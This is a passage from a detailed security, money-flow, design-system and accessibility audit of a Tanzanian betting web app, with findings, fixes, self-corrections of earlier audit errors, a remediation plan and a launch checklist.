if (parsed.amount != null && Math.abs(Number(parsed.amount)) !== Math.abs(txn.amount)) {
  audit({ category:"SECURITY", action:"webhook.amount_mismatch", payload:{ expected: txn.amount, got: parsed.amount }});
  return { handled: false, reason: "amount-mismatch" };
}
```
- [ ] Amount asserted, fails closed, alerts

## [ ] M5 — `db.user.list()` full-scan (10 sites)
`market-service.ts:844,2057`, `proposals-service.ts:227`, `kyc-service.ts:56,277`, `analytics.ts:129`, `insights.ts:88`, `affiliate-service.ts:499,585`.
```ts
const officers = await pc().user.findMany({
  where: { role: { in: ["ADMIN","COMPLIANCE","MODERATOR"] } },
  select: { id: true, email: true },
});
```
Then **delete `db.user.list()`**.
- [ ] All 10 converted · [ ] `db.user.list()` deleted

## [ ] M6 — Idempotency key regenerated per render, not intent
```tsx
// wallet/deposit/page.tsx:80 — SERVER component (no "use client")
<input type="hidden" name="idempotencyKey" value={crypto.randomUUID()} />
```
Generated at **server render**. `revalidatePath("/wallet")` after every deposit forces the re-render that **rotates the key**. Refresh/back/retry → new key → **second deposit, not deduped**.

The **bet path does it correctly** (`conviction-dial.tsx:750-755`, `useRef` per intent). Apply that.
- [ ] Client components with per-intent keys · [ ] 2G double-submit → one txn

## [ ] M7 — Affiliate `recruitCount` lost-update race
`affiliate-service.ts:230` — `recruitCount: acct.recruitCount + 1`, unlocked. **Display-only** (prizes computed from `db.referralReward` inside `withLock`). **No money at risk.**
**Fix:** `{ recruitCount: { increment: 1 } }`.
- [ ] Atomic increment

## [ ] M8 — Schema comment contradicts implementation
`storageKey String // never store binaries in DB` — then stores 4MB base64. Resolved with H8.
- [ ] Comment matches reality

## [ ] M9 — **NEW** · Deposit has no confirm step; bet and withdraw do
| Flow | Confirm? | Discloses |
|---|---|---|
| Bet | ✅ `BetConfirmModal` | side, stake, payout, net, **lean warning**, 10s locked quote |
| Withdraw | ✅ `WithdrawConfirm` | amount, provider (**no tax/net** — H12) |
| **Deposit** | ❌ **none** | — submits straight from `SubmitButton` |

Deposit moves real money from a player's mobile-money account. It should confirm amount + provider + destination MSISDN.

Lower severity than H12 (deposit has no hidden deduction), but it's an **inconsistency in the money-flow language** of the product: two of three money actions confirm.

- [ ] `DepositConfirm` mirroring `WithdrawConfirm` · [ ] shows amount, provider, MSISDN

## [ ] M10 — *(superseded — promoted to **H13**, see §4)*
Documentation drift proved larger than a Medium. See **H13**.

## [ ] M12 — **NEW v4** · `tsconfig` typechecks design mocks; `exclude` names deleted dirs

```jsonc
"include": ["next-env.d.ts", "**/*.ts", "**/*.tsx", ".next/types/**/*.ts"],
"exclude": ["node_modules", "50Pick Modernization", "50Pick ui v1"]
```

**`**/*.tsx` sweeps the whole repo**, so four design mocks outside `src/` are inside your TypeScript project and typechecked on every `tsc --noEmit` and every build:

```
50PICK/New Designs/handoff/pnl-chart.tsx
50PICK/New Designs/handoff/positions-performance-page.tsx
50PICK/New Designs/handoff/pnl-summary-strip.tsx
Final UI enhancement Kit/50pick-design-final/code/glyphs-additions.tsx
```

These are **design handoff artifacts, not product code**. They slow typecheck, and a mock that drifts from your real types will break the build for no reason.

**The `exclude` list is stale**: `50Pick Modernization` and `50Pick ui v1` **do not exist**. Same drift class as **H13** — configuration describing a repo that isn't this one.

The kit's 14 `.jsx` files are *not* swept (`include` lists only `ts`/`tsx`) — which is luck, not design.

**Fix:**
```jsonc
"include": ["next-env.d.ts", "src/**/*.ts", "src/**/*.tsx", "scripts/**/*.ts", "scripts/**/*.mts", ".next/types/**/*.ts"],
"exclude": ["node_modules", ".next", "50PICK", "Final UI enhancement Kit"]
```

- [ ] `include` scoped to `src/` + `scripts/` · [ ] stale `exclude` entries removed · [ ] design dirs excluded · [ ] `tsc --noEmit` still clean

## [ ] M11 — **NEW** · `next-themes` is a dead dependency
Declared in `package.json:88`. **Never imported** (`grep "from \"next-themes\"" src` → nothing). Ships bytes and implies switchable theming that doesn't exist.
- [ ] Removed from `package.json`

---

# 6. Low

## [ ] L1 — Dead `try/catch` in signature verification
`Buffer.from('zzzz-not-hex','hex')` **does not throw** — returns an empty buffer. Branch unreachable; falls to `length-mismatch`. Safe, but the reason code lies.
**Fix:** `if (!/^[0-9a-fA-F]+$/.test(sig)) return { valid:false, reason:"bad-signature-encoding" };`
- [ ] Explicit hex validation

## [ ] L2 — `winnersPaid` under-reports after settlement resume
Counter resets on re-entry → `market.settled` audit payload under-counts. Money right, audit number wrong — and it's the number a regulator reconciles.
**Fix:** derive from `SUM(finalPayout WHERE status='WIN')`.
- [ ] Derived from DB

## [ ] L3 — 50 hardcoded hex colours outside tokens
Across 548 files — mostly legitimate (brand constants, SVG/canvas). Offenders: `admin-charts.tsx:307`, `kyc-doc-viewer.tsx:74`, `invite/page.tsx:120,201`, `security-client.tsx:35`.
- [ ] Non-brand values tokenised

## [ ] L4 — VOID position claims `finalPayout` when refund forfeited
`p.finalPayout = p.stake` asserts full return; under C2 the bonus part wasn't returned. UI shows a refund that didn't happen. Largely resolved by C2.
- [ ] `finalPayout` = actual refund

## [ ] L5 — **NEW** · `--teal-*` holds a royal-268 hue
The kit seeds `--teal-500: oklch(45% 0.10 215)` (actual teal). The implementation sets `--teal-500: oklch(48% 0.200 268)` (royal indigo) and aliases `--royal-*` onto it, with a comment: *"`--teal-*` retained for backward compat."*

Deliberate and documented — but every future reader sees `teal` and gets indigo. `--aqua-*` (hue 195) is the *actual* teal-family ramp, so the naming actively misleads.

**Fix:** rename `--teal-*` → `--royal-*` as canonical; keep `--teal-*` as deprecated aliases for one release, then delete.
- [ ] `--royal-*` canonical · [ ] `--teal-*` deprecated then removed

## [ ] L6 — **NEW** · Small targets pass AA, fail AAA
`.btn-sm` 30px; icon buttons `h-8 w-8` (32px). **WCAG 2.2 AA (2.5.8) requires 24×24 — all pass.** AAA (2.5.5) wants 44×44.

For a mobile-first money product on shared/low-end Android, 44px on **money-adjacent** controls is worth it even though AA is met. Not a violation — an upgrade.
- [ ] Money-path icon buttons → 44px touch area (padding, not visual size)

---

# 7. Design system audit

## 7.0 Which artifact is authoritative — **re-derived from code (v3)**

v2 benchmarked against `kit/tokens.css` because `CLAUDE.md` names it "source of truth". That was wrong. Corrected hierarchy, established from the build itself:

| Artifact | Status | Evidence |
|---|---|---|
| `src/app/globals.css` | ✅ **AUTHORITATIVE — live** | imported by `layout.tsx:8`; **newest artifact** |
| `docs/design-master-brief.md` | ✅ **Design source of truth** | cited as such by the 2026-07-07 refinement spec; live palette matches it to **~0.3%** |
| `50PICK/New Designs/theme/globals.css` | ⚠️ Stale mock | self-labelled *"chat imports removed for mock"*; **live is ahead** (has `--brand-200`, `--pill-active`, `--hero-panel-grad`, `.btn-pill`; mock lacks all four) |
| `50PICK/design_handoff_.../kit/tokens.css` | ⚠️ Historical snapshot | teal hue **215** vs live royal **268**; ships dead `[data-theme="light"]` |
| `Final UI enhancement Kit/.../refinement-spec.md` | ⚠️ Proposal list, partially done | A1 sparkline **is** built (`mcardp-spark` in live CSS) |

**Consequence for this section:** the conformance analysis below benchmarks against **`design-master-brief.md`** (the real source of truth) and **live `globals.css`** — never against the kit snapshot. The v2 conclusions survive unchanged, because the live palette matches the brief either way. But the basis is now correct. → **H13**

## 7.0b Single theme — confirmed by exhaustive code search

The product has **one theme: dark royal.** Not a light mode that's unfinished — a light mode that was **deliberately killed** and correctly removed.

```
0  light-theme selectors in live globals.css  (no [data-theme], .light, prefers-color-scheme)
0  next-themes imports across src/            (dead dependency — M11)
0  dark: variants across 548 .tsx files
0  theme toggles / setTheme / ThemeToggle
1  forced declaration: color-scheme: dark     (globals.css:353)
```

`theme-provider.tsx:6`: *"Single dark-royal theme by invariant (no light mode — see DESIGN_AUTHORITY B3). ...There is NO theme switching here."*

**This is the right call for a money product** — one contrast surface to prove, one token set to govern, half the QA matrix. Every WCAG ratio in §9 is therefore a **complete** account of the product's contrast, not a sample of one mode.

The only defects are documentary: `CLAUDE.md` still advertises light/dark (**H13**), `next-themes` still ships (**M11**), the kit snapshot still carries a dead light palette (**H13**), and `DESIGN_AUTHORITY` — cited **three times** as the authority for this decision — **does not exist** (**H13**).

## 7.1 Kit conformance — **strong**

I converted `design-master-brief.md`'s ground-truth sRGB palette to OKLCH and compared it against the implemented tokens:

| Brief token | Hex | Computed OKLCH | Implemented | Δ |
|---|---|---|---|---|
| YES | `#00A24F` | `62.3% 0.167 151.2` | `oklch(62% 0.17 152)` | **~0.3%** |
| NO | `#E6424C` | `62.1% 0.200 22.1` | `oklch(62% 0.20 22)` | **~0.1%** |
| Gilt | `#D49824` | `72.0% 0.140 78.1` | `oklch(72% 0.14 78)` | **~0.1%** |
| Canvas royal | `#060A50` | `21.5% 0.122 268.0` | `oklch(15% 0.130 268)` | hue exact; L intentionally deeper |
| Aqua live | `#36BABA` | `72.1% 0.110 195.0` | `oklch(72% 0.110 195)` | **exact** |
| Claret | `#A4273F` | `48.0% 0.160 15.2` | `oklch(48% 0.160 15)` | **exact** |

**This is disciplined work.** Somebody converted the palette carefully and preserved it. The `--bg` divergence (15% vs 21.5%) is a deliberate "deep midnight" choice, documented inline.

## 7.2 How the live system evolved past the kit snapshot

These are not "divergences from spec" — the kit is the **older** artifact. This is the product moving forward and the snapshot staying behind.

| `kit/tokens.css` (historical) | Live implementation | Verdict |
|---|---|---|
| `--teal-*` hue **215** (actual teal) | hue **268** (royal indigo) | Intentional rebrand → matches brief. **Naming now misleads (L5).** |
| Full `[data-theme="light"]` | **No light mode — killed by invariant** | Correct. Snapshot's light block is **dead code** (**H13**). |
| `--type-h1: 34px` | `32px`, adds `--type-hero: 72px` | Intentional refinement |
| No CJK | CJK fallback on every family | **Improvement** — avoids multi-MB download on TZ mobile data |
| No claret/aqua | Adds both with strict usage rules | **Improvement** — the ≤8% aqua coverage rule is real design governance |

The implementation is **ahead of** the kit in every dimension. Benchmarking the product against the kit would have produced false findings — which is exactly the trap `CLAUDE.md` set (**H13**).

## 7.3 Governance quality — notable

The token comments encode **usage policy**, not just values:

> `/* Claret — Editorial weight only: Politics chip, Sovereign tier, regulator/footer crest. Never on YES/NO money surfaces or adjacent to NO-rose. */`

> `/* Aqua — Finishing pass only... ≤8% surface coverage. Never as a chip, button label, or anything semantic. */`

That is a design system with **rules**, not just a palette. It's the main reason conformance is high.

## 7.4 Status lexicon — clean
`TxnStatus` enum (`PENDING|PROCESSING|AML_REVIEW|CONFIRMED|FAILED|REVERSED|CANCELLED`) never leaks. `wallet/page.tsx:26` maps to player vocabulary (`pending|review|confirmed|failed`); `admin-status-lexicon.ts` + `status-badge.tsx` centralise admin labels — with a comment explaining the per-file `STATUS_LABEL` drift they replaced. **No finding.**

## 7.5 Responsive — sound
519 breakpoint utilities. Modals correctly use `w-full max-w-[…]`. `safe-area-inset` applied for notch. Bare `w-[Npx]` occurrences are SVG canvases, not layout. **No finding** (visual verification still needs a browser).

## 7.6 Motion — above standard
- `@media (prefers-reduced-motion: reduce)` on every keyframe (comment: *"Every @keyframes ships a prefers-reduced-motion branch"*) — **verified true**
- **Plus** a `data-motion` device throttle: `deviceMemory ≤4`, `hardwareConcurrency ≤4`, or `saveData` → reduced

Explicitly designed for mid-tier Android in Tanzania. **No finding — this is a strength.**

---

# 8. UX flow audit

## 8.1 Money-flow disclosure — inconsistent

| Flow | Confirm | Amount | Deduction | Net | Warning |
|---|---|---|---|---|---|
| **Bet** | ✅ modal, 10s locked quote | ✅ stake | ✅ implicit in payout | ✅ `payout − stake` | ✅ **lean warning** |
| **Withdraw** | ✅ modal | ✅ gross | ❌ **no tax line** | ❌ **no net** | ❌ |
| **Deposit** | ❌ **none** | — | — | — | — |

**The betting flow discloses more than the withdrawal flow.** Withdrawal is where the deduction happens. → **H12**, **M9**.

## 8.2 The withdrawal journey — where it breaks

```
1. /wallet/withdraw
   ├─ Tax notice: "tax on declared WINNINGS"     ← C8: FALSE for this player
   ├─ Amount: 100,000
   └─ [Confirm withdrawal]
2. WithdrawConfirm modal
   ├─ Amount: TZS 100,000                        ← H12: gross only
   ├─ Via: MPESA
   └─ [Send funds]
3. Money leaves. Player receives 85,000.
4. Receipt reveals the deduction.                ← first honest moment
```

Three chances to tell the truth. Zero taken. **Not one bug — a flow-level failure.**

## 8.3 What's genuinely excellent

**`BetConfirmModal`** — the strongest UX artifact in the codebase:
- Locked 10-second quote with countdown (comment: *"markets handle quote freshness without faking certainty"*)
- Side, stake, multiplier, payout, `net = payout − stake`
- **Lean warning**: `negative` → `--no-300`, `thin` → `--warning-fg`, `fair` → `--gold-300`

**A book warning you your payout is thin is rarer than it should be.** This is the standard the withdraw modal must meet.

**Empty/loading/error states:** 9 error boundaries (root, admin, auth, wallet, markets, positions, profile, proposals, global), 27 loading states, 3 not-found pages. The 12 routes without `loading.tsx` are static/form routes — **correct judgment, not a gap**.

**Self-exclusion respected in 11 places** including push notifications and watchlists — and **withdrawal is correctly NOT blocked**, so an excluded player can always retrieve their funds. That's the right call and easy to get wrong.

## 8.4 i18n — excellent, one risk

| Metric | Result |
|---|---|
| Keys | **1,286** (EN) / 1,286 (SW) / 1,284 (ZH) |
| Missing SW | **2** (`Unit`, `link` — structural) |
| Missing ZH | **2** (same) |
| Untranslated SW | **5** — all correct (`"Tanzania"`, `titleSwPlaceholder`, deliberate `*Sw` keys) |
| Mean SW expansion | **1.16×** · median 1.08× |
| Strings ≥1.5× | 190 / 1,268 |

**Near-perfect parity.** But expansion has a sharp tail on **short** labels:

| EN | SW | Ratio |
|---|---|---|
| `Top` | `Jedwali la Washindi` | **6.33×** |
| `ROI` | `Faida ya uwekezaji` | **6.00×** |
| **`NO`** | **`HAPANA`** | **3.00×** |
| `Won` | `Zilizoshinda` | 4.00× |
| `h ago` | `masaa yaliyopita` | 3.20× |

**`NO` → `HAPANA` is the one that matters** — the primary betting control.

**The team anticipated it.** `conviction-dial.tsx:949`: *"Pole labels localize to NDIO / HAPANA / 是 / 否; the box is widened"* with `min-w-[3.5rem]`. **Handled.**

Unverified: `Top` (6.33×) and `ROI` (6.00×) in leaderboard/positions table headers, where `.btn { white-space: nowrap }` could force overflow. **Needs browser verification at 360px in Swahili.**

- [ ] SW visual pass at 360px: leaderboard, positions, wallet tabs

---

# 9. Accessibility audit

**Method:** OKLCH → sRGB → WCAG relative luminance, computed from actual `globals.css` tokens. Not estimates.

## 9.1 Contrast — 5 failures, 17 passes

**Failures → H10.** Passes:

| Pair | Ratio | Req |
|---|---|---|
| `--text` on `--bg` | **18.31** | 4.5 |
| `--text` on `--bg-elevated` | **16.91** | 4.5 |
| `--text-muted` on `--bg` | **12.67** | 4.5 |
| `--text-subtle` on `--bg` | **7.22** | 4.5 |
| `--yes-500` on `--bg` | **5.78** | 4.5 |
| `--no-500` on `--bg` | **4.83** | 4.5 |
| `--gold-500` on `--bg` | **7.69** | 4.5 |
| `--aqua-300` on `--bg` | **10.82** | 4.5 |
| `btn-primary` white on `--teal-500` | **6.93** | 4.5 |
| `btn-yes` dark on `--yes-500` | **5.82** | 4.5 |
| focus ring `--teal-300` on `--bg` | **8.86** | 3.0 |

Text contrast isn't just passing — it's **generous**. The failures are confined to two button backgrounds and the border ramp.

## 9.2 Other criteria

| Criterion | Status |
|---|---|
| 1.1.1 Non-text content | ✅ 239 `aria-label`, 11 `alt`, `aria-hidden` on decorative marks |
| 1.3.1 Info & relationships | ✅ 104 `role=`, `<main id="main-content">`, 43 pages with `<main>` |
| **2.4.1 Bypass blocks** | ❌ **FAIL — no skip link (H11)** |
| 2.4.7 Focus visible | ✅ `:focus-visible` + 2px outline, offset 2px, ratio 8.86 |
| 2.5.8 Target size (AA) | ✅ all ≥24px (`btn-sm` 30, icons 32) |
| 2.5.5 Target size (AAA) | ⚠️ 30/32px < 44px (**L6**) |
| 3.1.1 Language of page | ✅ `<html lang={lang}>` — **dynamic** per locale |
| 2.3.3 Animation from interactions | ✅ `prefers-reduced-motion` on every keyframe + device throttle |
| 4.1.2 Name, role, value | ✅ 12 `aria-live`, 5 `aria-describedby` |

**One Level A failure (H11), one Level AA cluster (H10).** For 548 components that is a good result — most products fail far more.

## 9.3 Existing tooling not run
`scripts/a11y-audit.mjs` (Playwright + axe-core) already checks alt text, labels, single `<h1>`, `<html lang>`, keyboard reachability across 21 routes. **It has never run in CI (H9).** Add it, and extend it with the skip-link assertion.

- [ ] `a11y-audit.mjs` in CI · [ ] skip-link assertion added · [ ] axe-core on the 3 money flows

---

# 10. Verified correct

Everything below I actively tried to break and could not.

### Security & authorization
- **All 32 `dev-test` routes** gated on `NODE_ENV !== "production"`. Checked individually.
- **All 17 admin action files** enforce role tiers (exception `totp-verify/actions.ts` is correctly pre-auth).
- **Role tiering well-designed** — `MONEY_ROLES`/`COMPLIANCE_ROLES` exclude `MODERATOR`, with a comment naming the escalation it prevents.
- **All server actions authenticate** via `currentSession()` — my v1 grep missed the name (§11).
- **TOTP step-up at the action layer**; `checkAdminTotp` vs `requireAdminTotp` split for streaming routes.
- **KYC doc access**: role + TOTP + audited per view + `no-store` + no client-supplied path.
- **PII masked/hashed** in exports (`+2557*****89`, salted SHA-256).
- **SQL injection**: 4 `$queryRawUnsafe`, all static or `$1`-parameterised.
- **Crypto**: scrypt, AES-256-GCM versioned envelope + legacy upgrade, `timingSafeEqual`, CSPRNG; refuses to boot without secrets.
- **Service worker** never caches authenticated HTML or `/api/`.

### Money paths
- **`cashOut` IDOR**: ownership checked **3×**.
- **Deposit exactly-once**: status-gated under the wallet lock; sync + webhook share it.
- **RG re-check at credit time** — deposit initiated before self-exclusion is **reversed, not credited**. Most teams miss this.
- **Withdrawal**: `balance → hold` with `requireBalanceGte`; in-lock idempotency re-check with a comment naming the stranded-funds bug it prevents.
- **Withdrawal NOT blocked during self-exclusion** — players always retrieve funds.
- **Settlement resumability**: `settledAt` last, `status==="OPEN"` filter as second guard.
- **Late-bet defence**: close re-checked inside the market lock, full unwind on `closedInFlight`.
- **Deadlock avoidance**: wallet→market ordering; `pendingBonusRefunds` deferred outside the lock.
- **Bonus fulfilment guard**: `requireBonusBalanceGte` prevents minting cash on invariant drift.
- **Zod `.int()`** on stake/deposit/withdraw — load-bearing, holds.

### Compliance
- **Officer-conflict block** correctly implemented — only the prod gate was removed (C7).
- **Two-officer resolution** with self-countersign prevention.
- **Objection gate**: money frozen while objections stand; eligibility guarded; **deliberately not** try/catch-wrapped so it fails **closed**.
- **Self-exclusion** honoured in 11 places.
- **RG deposit limits** use time-bounded `SUM` (fixing documented bug #312).
- **Audit chain** design sound (HMAC linkage, serialized queue, hydration-first) — flaw is multi-instance only.
- **`AuditLog` has no FK to `User`** — deliberate, so the log never fails or cascade-deletes under DSAR.

### Design
- **Token fidelity to the brief: ~0.1–0.3%** on YES/NO/gilt/aqua/claret.
- **Token comments encode usage policy** (claret editorial-only; aqua ≤8% coverage).
- **CJK fallback** avoids multi-MB webfont on TZ mobile data.
- **`prefers-reduced-motion` on every keyframe** + `deviceMemory`/`saveData` throttle.
- **1,286 i18n keys, near-perfect EN/SW/ZH parity.**
- **`HAPANA` overflow anticipated** and handled (`min-w-[3.5rem]`).
- **`BetConfirmModal`**: locked quote, full payout maths, lean warning.
- **Status lexicon centralised**; enums never leak.
- **9 error boundaries, 27 loading states, 3 not-found.**
- **Text contrast generous** (18.31 body).

### Data & deps
- `Decimal(18,2)`, `@@unique([provider, providerRef])`, `@unique` idempotency, `CHECK (balance >= 0)`.
- Next 16.2.4, React 19.2.5, Prisma 6.19.3, Zod 3.25.76 — current, no known CVEs.
- 57 test suites incl. `money-invariants`, `concurrency`, `wallet-atomic`, `late-bet`, `payment-webhook`.

---

# 11. Corrections

Recording these because an audit that hides its own errors is worthless.

## 11.0 Corrections to v7 (made in v8)

| v7 claim | Correction |
|---|---|
| §18.5: `public/brand/*.svg` — *"unused, delete, 51 KB, low value"* | **Wrong, and backwards.** All four are the **OLD round-1 logo** (ring + "50" numerals), and three feed **shipped** PNGs — the PWA home-screen icon and the header of every transactional email. They must be **regenerated from `mark-a.svg`**, not deleted. → **C11** |
| §18.5 listed `mark-color-512.png` / `maskable-512.png` as *"USED — keep"* | **Used, yes. Correct, no.** Verified **visually**: the shipped icon has the royal ring, the "50" numerals and the counterweight hub. `mark-a.svg` has none of them. |
| — | **The method error:** I checked **reachability** (*is it referenced?*) and never checked **correctness** (*is it the right artifact?*). An asset can be perfectly wired and completely wrong. Same class as the `proxy.ts` retraction below — **I asked the wrong question of the file.** |
| — | **Not a finding (verified):** `brand.tsx`'s hardcoded `#1EA362`/`#B03A3E`/`#E3BC66` diverge from theme tokens **by design**. They are a byte-identical port of the delivered `mark-a.svg`, and the code comment *"Delivered brand hex is authoritative"* is correct. **Brand identity ≠ theme tokens.** I checked before reporting. |

## 11.1 Corrections to v3 (made in v4) — **the most serious error in this audit**

| v3 claim | Correction |
|---|---|
| **H3: "No security headers at all — no CSP, HSTS, X-Frame-Options"** (High, reported in v1, v2 **and** v3) | **FALSE. RETRACTED.** All six headers exist in `src/proxy.ts` with a full CSP, HSTS gated to production, `frame-ancestors 'none'`, and a correct matcher. **Next 16 renamed the `middleware.ts` convention to `proxy.ts`.** I grepped `next.config.ts` for header keys, ran `ls src/middleware.ts middleware.ts`, got nothing, and asserted absence. **I checked for the old convention and never opened the file that replaced it** — even though its header says *"Renamed from `middleware.ts` per Next 16 file-convention change."* |
| — | **How it was caught:** only because you asked what to delete. My orphan detector flagged `src/proxy.ts` as "never imported" — and reading it to confirm deletion revealed the headers. **A cleanup request caught a security finding I'd asserted three times.** |
| v3 implied `50PICK/` and `Final UI enhancement Kit/` had build references ("42 references") | Those are **prose mentions** in `CLAUDE.md`/`docs/`, not imports. Verified: **0 build references**. → §15.3 |

**What this says about method.** H3 is the same failure mode as **H13**: I trusted a convention I *expected* rather than reading what's there. It's also the same failure as **C8** (copy asserting behaviour nobody verified) and **C3** (a reconciler asserting correctness it can't check). *Asserting absence is a positive claim and needs positive evidence.* I asserted absence from two greps.

**Corrective applied:** §15.6 ("DO NOT DELETE — looks dead, is load-bearing") exists specifically so this error cannot be repeated during cleanup. Framework-convention files have zero imports **by design**.

## 11.2 Corrections to v2 (made in v3)

| v2 claim | Correction |
|---|---|
| §7 benchmarked the design system against `kit/tokens.css` as "the kit" | **Wrong basis.** That file is a *historical snapshot* (teal 215 vs live royal 268; dead light palette). The real source of truth is `docs/design-master-brief.md`, and the authoritative artifact is live `globals.css`. I trusted `CLAUDE.md`'s "source of truth" table — the same doc I had just flagged as stale in M10. **Conclusions survive** (live matches the brief to ~0.3% either way); the basis was wrong. → §7.0 |
| M10 rated **Medium** ("docs stale") | **Promoted to H13.** Doc drift is systemic: `CLAUDE.md` is false on theming *and* i18n; ~20 `docs/` audit files claim completion states nothing verifies; and `DESIGN_AUTHORITY` — cited 3× as the authority for the single-theme decision — **does not exist**. On a licensed platform this is a candour problem, adjacent to C7 and C8. |
| v2 treated the kit's `[data-theme="light"]` block as a live divergence | It is **dead code** in a superseded snapshot. The product has one theme by design, verified: 0 light selectors, 0 `next-themes` imports, 0 `dark:` variants across 548 files. |
| v2 implied the design system should conform *to* the kit | Backwards. The live system is **ahead of** the kit on every axis (CJK fallback, claret/aqua governance, motion throttle). Benchmarking against the kit would have generated false findings. |

**Method change in v3:** every `.md` in this repo is an unverified claim. **The compiled artifact is the spec.** This finding exists because the operator caught it, not because I did.

## 11.3 Corrections to v1 (made in v2)

| v1 claim | Correction |
|---|---|
| *"Design: theme discipline is broadly good"* based on counting 50 hex codes | **Unfounded method.** I never opened the kit. v2 computes actual token fidelity (~0.3%) and finds **5 real contrast failures** counting could never surface. |
| *"Accessibility has real investment (239 aria-labels)"* | Counting attributes is not an audit. v2 finds a **Level A failure** (no skip link) that 239 aria-labels don't mitigate. |
| L3 hardcoded colours listed as the *only* design finding | Wrong prioritisation. The real findings are H10/H11/H12. L3 is cosmetic. |
| v1 said *"UI consistency assessed"* | It wasn't. Zero components read. v2 reads the money-flow components and finds **H12** and **M9**. |
| v1 flagged 15 server-action files as *"no session call"* | **False positive**, corrected in v1 §7 but worth restating: all use `currentSession()`. My grep pattern was wrong. |
| v1: *"C5 webhook replay"* implied double-credit risk | **Overstated.** Status-gating prevents double-credit. v2 states the real risk (state-transition abuse) and says so plainly. |
| v1 didn't check `CLAUDE.md` claims | **M10/M11** — docs claim light/dark + FR; neither exists. |

**Method changed in v2:** every design claim is computed or quoted, never inferred from a grep count.

---

# 12. Architecture assessment

## 12.1 Strengths
Clean service-layer separation; sophisticated concurrency (documented lock ordering, in-lock re-reads, compensating rollbacks, deferred cross-lock work). The design system has **governance**, not just tokens.

## 12.2 The single structural weakness

```ts
export async function withLock<T>(key: string, fn: () => Promise<T>): Promise<T> {
  if (hasDatabase()) return withAdvisoryLock(key, fn);
  return withMemoryLock(key, fn);        // ← dev/test path
}
```

The in-memory mutex is single-process and perfectly serializing. Against it:
- **C6** (audit fork) — invisible: one process, one ring
- **H2** (rate limiter) — invisible: one Map
- **M1** (hash collision) — invisible: string keys, no hashing
- **C4** (RG TOCTOU) — **partially masked**

**One gap explains four findings.** The fix is a Postgres service container in CI — highest leverage after Sentry.

## 12.3 The inverted trust hierarchy
```
Today:      Wallet.balance = TRUTH  →  LedgerEntry = hopeful shadow
Should be:  LedgerEntry = TRUTH     →  Wallet.balance = materialised view
```
C2 proves the consequence: ledger says "refunded", wallet says "destroyed", nothing notices.

## 12.4 The new theme: copy is part of the money path
C8 is not a design bug or a backend bug. **It's the seam between them.** The copy describes intended behaviour; the code implements a placeholder; nothing binds them. Same class as C3 (ledger describes intended movement, code fire-and-forgets it).

**Add CI checks that bind money-behaviour copy to money-behaviour code.**

## 12.5 Scalability ceiling

| Component | Ceiling | Blocker |
|---|---|---|
| Audit chain | **1 instance** | C6 |
| Rate limiting | **1 instance** | H2 |
| `/api/health` | ~50k users | H4 |
| KYC submission | ~10k players | H5 |
| KYC storage | ~100k players | H8 |
| Money paths | **Horizontal** ✅ | advisory locks work |
| Design system | **No ceiling** ✅ | tokens, i18n, motion all scale |

**The money engine and the design system scale. The scaffolding between them does not.**

---

# 13. Remediation plan

## Week 1 — Stop the bleeding
- [ ] **H6** Sentry (30 min — **do this first**, makes everything else visible)
- [ ] **C1 + C8 + H12** — tax basis, copy, and confirm modal **ship together**
- [ ] **C2** Bonus restitution; ledger after wallet
- [ ] **C7** Restore POCA §16 hard-lock + boot assertion
- [ ] **H7** Env var names + boot assertion
- [ ] **C10** `git rm db-check.cjs`; check history/logs for leaked NIDA output
- [ ] **C11** Regenerate 4 brand SVGs from `mark-a.svg`; rebuild 7 PNGs; verify PWA install + email header
- [ ] **C9** Rewrite `CLAUDE.md:39` + `:278` (15 min — **highest risk-removed-per-minute in this report**); write `DESIGN_AUTHORITY.md`; SUPERSEDED-header the teal kit

## Week 2 — Compliance & payments
- [ ] **C4** RG gates inside the lock; include `PROCESSING`
- [ ] **C5** Mandatory timestamp; sign `timestamp.body`; nonce table
- [ ] **M4** Verify webhook amount
- [ ] **H9** CI with Postgres service container ← *unblocks verification of everything*

## Week 3 — Provability
- [ ] **C3** Ledger inside the money transaction
- [ ] **C3** Trial balance + nightly job + alerting
- [ ] **C6** DB-side chain; `await persist()`; `@@unique([prevHash])`
- [ ] **M3** Indexes

## Week 4 — Scale, a11y, polish
- [ ] **H4** `user.count()` · **H5** indexed NIDA · **M5** DB-side filters
- [ ] **H2** Redis rate limiter · **H1** escape JSON-LD *(H3 retracted — headers already exist)*
- [ ] **H10** contrast tokens (`btn-no`, `btn-danger`, `--border-control`)
- [ ] **H11** skip link · **M9** deposit confirm
- [ ] **C9 tail / §16** — `STATUS:` header on all 35 design docs; delete `glyphs-additions.tsx`; reconcile `docs/`
- [ ] **M1, M2, M6, M7, M11, M12, L1–L6**
- [ ] **§15 cleanup** — delete 4 dead components + 2 zips; move design material out; fix `tsconfig`

## Week 5 — Storage & verification
- [ ] **H8** KYC → object storage + retention
- [ ] Re-run 57 suites **against Postgres at 2+ instances**
- [ ] Load test: 100k users, 1k concurrent bets, 10k-position settlement
- [ ] `a11y-audit.mjs` + axe-core in CI
- [ ] **Swahili visual pass at 360px** (H10 tail, i18n overflow)
- [ ] **Third-party penetration test**

## Week 6 — Sign-off
- [ ] DR restore rehearsal
- [ ] Reconciliation report to the GBT
- [ ] Legal review of tax copy (C8)

---

# 14. Launch gate

**Do not launch until every box is ticked.**

## Money correctness
- [ ] C1 — tax on winnings only; TRA basis in writing
- [ ] C8 — copy matches code, reviewed by a Swahili reader
- [ ] H12 — tax + net shown before confirm
- [ ] C2 — bonus never destroyed; historical forfeits compensated
- [ ] C3 — trial balance nightly, **zero drift**
- [ ] M2 — `Σ payouts == floor(netPool)`

## Compliance
- [ ] C4 — 10 concurrent deposits vs 100k cap → **exactly 1** succeeds
- [ ] C7 — override **hard-locked off**; prod DB verified `false`
- [ ] C6 — 2-instance test: no fork
- [ ] Audit query: zero historical conflicted resolutions

## Security
- [ ] C5 — replay without timestamp → **401**
- [ ] M4 — amount mismatch fails closed + alerts
- [ ] H1 — XSS PoC inert
- [x] ~~H3 — security headers~~ **RETRACTED: verified present in `src/proxy.ts`**
- [ ] Confirm `securityheaders.com` grade A against the deployed URL (validates `proxy.ts` fires in prod)
- [ ] Third-party pentest passed

## Accessibility & design
- [ ] H10 — contrast script: **0 failures**
- [ ] H11 — skip link present, first focusable
- [ ] `a11y-audit.mjs` green in CI
- [ ] Swahili 360px pass: no overflow on leaderboard/positions/wallet

## Operations
- [ ] H6 — Sentry live, alerts reach a human
- [ ] H7 — staging webhook round-trip succeeds
- [ ] H9 — CI green against Postgres; merge blocked on failure
- [ ] H9 — DR restore **rehearsed**; RTO/RPO documented
- [ ] H4/H5 — 100k load test passes

## Data
- [ ] H8 — KYC out of Postgres; retention live
